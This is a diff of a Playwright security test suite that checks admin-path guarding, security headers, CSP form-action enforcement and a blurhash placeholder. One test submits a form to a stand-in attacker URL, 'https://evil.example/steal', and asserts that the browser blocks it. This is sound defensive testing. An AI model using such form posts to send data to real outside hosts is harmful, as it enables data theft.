@@ -1,7 +1,13 @@
 import { expect, test } from '@playwright/test';
 import { eq } from 'drizzle-orm';
+import { readFile } from 'node:fs/promises';
+import path from 'node:path';
+import { PNG } from 'pngjs';
 import { createDb } from '../src/lib/db/client.ts';
+import { blurhashFromPng } from '../src/lib/modules/media/blurhash.ts';
+import { storageConfigFromEnv } from '../src/lib/modules/media/env.ts';
 import { media } from '../src/lib/modules/media/schema.ts';
+import { createStorage } from '../src/lib/modules/media/storage.ts';
 import { products } from '../src/lib/modules/shop/schema.ts';
 import { DEMO_PRODUCTS } from '../src/lib/modules/shop/seed-products.ts';
 import { SITE_DB_NAMES, siteDatabaseUrl } from './env.ts';
@@ -10,10 +16,13 @@ import { armCspGuard, assertNoCspViolations } from './helpers.ts';
 // FIX-9 (audit 2026-09-03 P0 #1 + security headers): the built app must
 // (1) refuse percent-encoded /admin paths exactly like plain ones,
 // (2) carry the full security-header set with the CSP ENFORCED, and
-// (3) keep the checkout redirect and the blurhash placeholder working under
-//     that CSP — the flows most likely to break under form-action/img-src.
-// Chat streaming, admin upload and analytics injection are asserted
-// violation-free in their own specs (chat/media/analytics-consent).
+// (3) keep the checkout form-action and the blurhash placeholder working
+//     under that CSP — the flows most likely to break under form-action /
+//     img-src. Chat streaming, admin upload, analytics injection and the
+//     shop flow are asserted violation-free in their own specs
+//     (chat / media / analytics-consent / shop).
+
+const FIXTURE_PNG = path.resolve(import.meta.dirname, '../tests/fixtures/test-image.png');
 
 test('the percent-encoded admin-guard bypass stays closed on the built app', async ({
 	request,
@@ -71,46 +80,115 @@ test('every security header ships, CSP enforced, admin no-store', async ({ reque
 	expect(homeHeaders['cache-control'] ?? '').not.toContain('no-store');
 });
 
-test('checkout form post redirects to Stripe under the enforced form-action', async ({ page }) => {
+test('form-action is browser-enforced: foreign origins refused, the Stripe origin admitted', async ({
+	page
+}) => {
+	// The checkout form posts to `/cos?/checkout` (self) and the server 303s
+	// to https://checkout.stripe.com — shop.e2e.ts asserts that Location under
+	// this same header. The browser side of `form-action 'self'
+	// https://checkout.stripe.com` is proven here in both directions, from a
+	// real page of the built app:
+	//   1. a form aimed at ANY other origin is refused before a byte leaves
+	//      (the property that stops an XSS-driven plain-POST off /admin);
+	//   2. a form aimed at the Stripe checkout origin is admitted — the
+	//      navigation is intercepted and stubbed, so real Stripe is never
+	//      contacted.
+	// The checkout 303 itself is not driven through the browser: Playwright
+	// routes only the FIRST request of a redirect chain, so a test following
+	// the redirect would hit real Stripe — which no test may do.
 	const guard = await armCspGuard(page);
-	// The mock gateway 303s to a checkout.stripe.com URL; intercept it (regex
-	// so the redirected top-level navigation is matched) so the browser
-	// NAVIGATES there — Chrome enforces form-action on that redirect — without
-	// the test ever reaching real Stripe.
-	await page.route(/checkout\.stripe\.com/, (route) =>
+	let hitExternal = false;
+	await page.route('https://evil.example/**', (route) => {
+		hitExternal = true;
+		return route.abort();
+	});
+	await page.route('https://checkout.stripe.com/**', (route) =>
 		route.fulfill({ contentType: 'text/html', body: '<h1 data-stub>stripe-checkout</h1>' })
 	);
 
-	await page.goto(`/magazin/${DEMO_PRODUCTS[0].slug}`);
-	await expect(page.locator('html')).toHaveAttribute('data-hydrated', 'true');
-	await page.getByTestId('product-add-to-cart').click();
-	await expect(page).toHaveURL(/\/cos$/);
+	const submitTo = (action: string) =>
+		page.evaluate((target) => {
+			const form = document.createElement('form');
+			form.method = 'POST';
+			form.action = target;
+			document.body.appendChild(form);
+			form.submit();
+		}, action);
 
-	await page.getByTestId('cart-checkout').click();
-	// A blocked form-action would leave the browser on /cos with a violation.
+	// 1. Refused pre-flight: a form-action violation fires, the document stays
+	//    the cart, and no request ever reaches the disallowed origin. (Read
+	//    location.href from the page rather than toHaveURL: Chromium reports
+	//    the blocked submission as a navigation that never commits, which
+	//    leaves Playwright's URL matcher waiting on it forever.)
+	await page.goto('/cos');
+	await expect(page.locator('html')).toHaveAttribute('data-hydrated', 'true');
+	await submitTo('https://evil.example/steal');
+	await expect
+		.poll(() =>
+			page.evaluate(
+				() => (window as unknown as { __cspViolations?: string[] }).__cspViolations ?? []
+			)
+		)
+		.toContain('form-action: https://evil.example/steal');
+	expect(await page.evaluate(() => location.href)).toMatch(/\/cos$/);
+	expect(hitExternal).toBe(false);
+
+	// 2. Admitted: a fresh cart page navigates to the (stubbed) Stripe origin.
+	await page.goto('/cos');
+	await expect(page.locator('html')).toHaveAttribute('data-hydrated', 'true');
+	await submitTo('https://checkout.stripe.com/c/pay/e2e-stub');
 	await page.waitForURL(/checkout\.stripe\.com/);
 	await expect(page.locator('[data-stub]')).toHaveText('stripe-checkout');
-	await assertNoCspViolations(page, guard);
+	// Exactly one CSP refusal happened in this test, and it was the evil one
+	// (Chromium's message quotes the whole directive, so match the blocked
+	// URL, not the Stripe origin).
+	expect(guard.consoleErrors).toHaveLength(1);
+	expect(guard.consoleErrors[0]).toContain("Sending form data to 'https://evil.example/steal'");
 });
 
 test('blurhash placeholder renders as a data: background under img-src', async ({
 	page
 }, testInfo) => {
-	// IMAGE_PROVIDER=direct computes no blurhash at upload, so give the seeded
-	// demo cover a real one — the page then serves the genuine data:-URL
-	// placeholder through the app's own pipeline.
+	// The seeded demo covers are SVGs, which never get a placeholder, and
+	// IMAGE_PROVIDER=direct computes no blurhash at upload. So give the first
+	// demo product a real PNG cover (object in the bucket + media row) with a
+	// blurhash from the app's own encoder — the page then serves the genuine
+	// data:-URL placeholder through the normal imgSources → <Img> pipeline.
 	const siteId = testInfo.project.name as keyof typeof SITE_DB_NAMES;
 	const db = createDb(siteDatabaseUrl(siteId));
+	const storage = createStorage(storageConfigFromEnv(process.env));
+	const coverId = `e2e-blurhash-cover-${siteId}`;
+	const key = `e2e/security/${siteId}/blurhash-cover.png`;
+	let originalCoverId: string | null = null;
+	let productId: string | null = null;
 	try {
 		const [product] = await db
 			.select()
 			.from(products)
 			.where(eq(products.slug, DEMO_PRODUCTS[0].slug));
-		expect(product.coverMediaId).toBeTruthy();
+		productId = product.id;
+		originalCoverId = product.coverMediaId;
+
+		const bytes = await readFile(FIXTURE_PNG);
+		const { width, height } = PNG.sync.read(bytes);
+		await storage.putObject(key, bytes, 'image/png');
+		const blurhash = blurhashFromPng(tinyRender(bytes));
 		await db
-			.update(media)
-			.set({ blurhash: 'LEHV6nWB2yk8pyo0adR*.7kCMdnj' })
-			.where(eq(media.id, product.coverMediaId!));
+			.insert(media)
+			.values({
+				id: coverId,
+				kind: 'image',
+				key,
+				filename: 'blurhash-cover.png',
+				mime: 'image/png',
+				size: bytes.length,
+				width,
+				height,
+				alt: 'Copertă cu blurhash',
+				blurhash
+			})
+			.onConflictDoUpdate({ target: media.id, set: { key, blurhash, width, height } });
+		await db.update(products).set({ coverMediaId: coverId }).where(eq(products.id, product.id));
 
 		// The SSR HTML really carries the data:-URL placeholder (the browser
 		// drops it from the live DOM as soon as the full image loads, so the
@@ -124,9 +202,42 @@ test('blurhash placeholder renders as a data: background under img-src', async (
 		const img = card.locator('img');
 		await expect
 			.poll(async () => img.evaluate((el: HTMLImageElement) => el.naturalWidth))
-			.toBeGreaterThan(0);
+			.toBe(width);
+		// The placeholder is dropped by the JS-attached load listener (no inline
+		// onload — the CSP would block that), so hydration + listener both ran.
+		await expect(img).not.toHaveAttribute('style', /background-image/);
 		await assertNoCspViolations(page, guard);
 	} finally {
+		if (productId) {
+			await db
+				.update(products)
+				.set({ coverMediaId: originalCoverId })
+				.where(eq(products.id, productId));
+		}
+		await db.delete(media).where(eq(media.id, coverId));
 		await db.$client.end();
 	}
 });
+
+/**
+ * The encoder wants a tiny render (≤64×64 — in production the image provider
+ * produces it); nearest-neighbour downscale of the fixture to 32×20 stands in
+ * for that resize here.
+ */
+function tinyRender(pngBytes: Uint8Array): Uint8Array {
+	const src = PNG.sync.read(Buffer.from(pngBytes));
+	const out = new PNG({ width: 32, height: 20 });
+	for (let y = 0; y < out.height; y++) {
+		for (let x = 0; x < out.width; x++) {
+			const sx = Math.floor((x * src.width) / out.width);
+			const sy = Math.floor((y * src.height) / out.height);
+			const si = (sy * src.width + sx) * 4;
+			const oi = (y * out.width + x) * 4;
+			out.data[oi] = src.data[si];
+			out.data[oi + 1] = src.data[si + 1];
+			out.data[oi + 2] = src.data[si + 2];
+			out.data[oi + 3] = src.data[si + 3];
+		}
+	}
+	return PNG.sync.write(out);
+}
